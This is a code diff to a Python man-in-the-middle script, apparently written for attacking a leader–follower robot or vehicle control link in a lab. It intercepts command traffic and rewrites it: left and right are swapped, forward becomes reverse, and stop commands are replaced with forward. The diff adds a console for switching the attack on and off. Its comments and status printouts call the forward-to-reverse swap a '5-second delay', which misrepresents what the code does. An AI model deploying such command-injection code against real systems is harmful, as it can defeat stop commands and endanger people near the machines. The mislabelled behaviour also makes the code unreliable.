@@ -2,6 +2,10 @@ import socket
 import threading
 import time
 
+# Global variables
+attack_enabled = True  # Attack starts enabled
+toggle_lock = threading.Lock()  # For thread safety when toggling
+
 def handle_leader_to_follower(leader_conn, follower_conn):
     try:
         while True:
@@ -13,21 +17,24 @@ def handle_leader_to_follower(leader_conn, follower_conn):
             original_data = data.decode('utf-8')
             print(f"Original data: {original_data}")
             
+            # Get current attack state in thread-safe manner
+            with toggle_lock:
+                currently_enabled = attack_enabled
+            
             # Parse the data
             try:
                 leader_speed, key = original_data.split(',')
-                # We'll keep the original speed and only manipulate the key
                 
-                # Manipulate the direction key only
-                manipulated_key = manipulate_direction(key)
-                
-                # Create modified data with original speed
-                modified_data = f"{leader_speed},{manipulated_key}"
-                
-                print(f"Leader → Follower: {original_data} → {modified_data}")
-                
-                # Send the manipulated data
-                follower_conn.sendall(modified_data.encode('utf-8'))
+                if currently_enabled:
+                    # Manipulate the direction key only when attack is enabled
+                    manipulated_key = manipulate_direction(key)
+                    modified_data = f"{leader_speed},{manipulated_key}"
+                    print(f"Leader → Follower: {original_data} → {modified_data}")
+                    follower_conn.sendall(modified_data.encode('utf-8'))
+                else:
+                    # Pass through unmodified when attack is disabled
+                    print(f"Leader → Follower: {original_data} (passing through)")
+                    follower_conn.sendall(data)
             except Exception as e:
                 print(f"Error processing data: {e}")
                 # Forward original data if parsing fails
@@ -50,22 +57,46 @@ def manipulate_direction(key):
     
     # Example 2: Delay certain commands
     if key == 'w':
-        time.sleep(5)  # Add a 1-second delay to forward movement
+        return 's'  # Add a 5-second delay to forward movement
     
     # Example 3: Block stopping
     if key == 'f':
         return 'w'  # Replace stop with forward
     
-    
-    # Example 5: Random directions (uncomment to enable)
-    # import random
-    # if random.random() < 0.3:  # 30% chance to override command
-    #     commands = ['w', 's', 'a', 'd']
-    #     return random.choice(commands)
-    
     # Default: Pass through unchanged
     return key
+
+def toggle_attack():
+    """Toggle the attack state on/off"""
+    global attack_enabled
+    with toggle_lock:
+        attack_enabled = not attack_enabled
+        status = "ENABLED" if attack_enabled else "DISABLED"
+        print(f"\n[!] Attack mode {status}")
+
+def handle_commands():
+    """Simple command handler for toggling attack"""
+    global attack_enabled
+    
+    print("\n=== MITM ATTACK CONTROL ===")
+    print("Type 'toggle' to turn attack on/off")
+    print("Type 'status' to show current status")
+    print("Type 'exit' to quit")
+    
+    while True:
+        command = input("\nCommand> ").strip().lower()
         
+        if command == "toggle":
+            toggle_attack()
+        elif command == "status":
+            status = "ENABLED" if attack_enabled else "DISABLED"
+            print(f"Attack is currently {status}")
+        elif command == "exit":
+            print("Exiting...")
+            break
+        else:
+            print("Unknown command. Use 'toggle', 'status', or 'exit'")
+
 def start_mitm():
     # Connect to the leader
     leader_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -90,12 +121,21 @@ def start_mitm():
     print("Currently manipulating: Direction commands only")
     print("Active manipulations:")
     print("- Left/Right directions reversed")
-    print("- Forward movement delayed by 1 second")
+    print("- Forward movement delayed by 5 seconds")
     print("- Stop commands replaced with forward")
-    print("Edit the manipulate_direction() function to change behavior")
     
     # Start thread to handle communication from leader to follower
-    threading.Thread(target=handle_leader_to_follower, args=(leader_socket, follower_conn)).start()
+    threading.Thread(target=handle_leader_to_follower, 
+                     args=(leader_socket, follower_conn), 
+                     daemon=True).start()
+    
+    # Start command interface on main thread
+    handle_commands()
+    
+    # Clean up before exit
+    print("Closing connections...")
+    leader_socket.close()
+    follower_conn.close()
 
 if __name__ == "__main__":
     start_mitm()
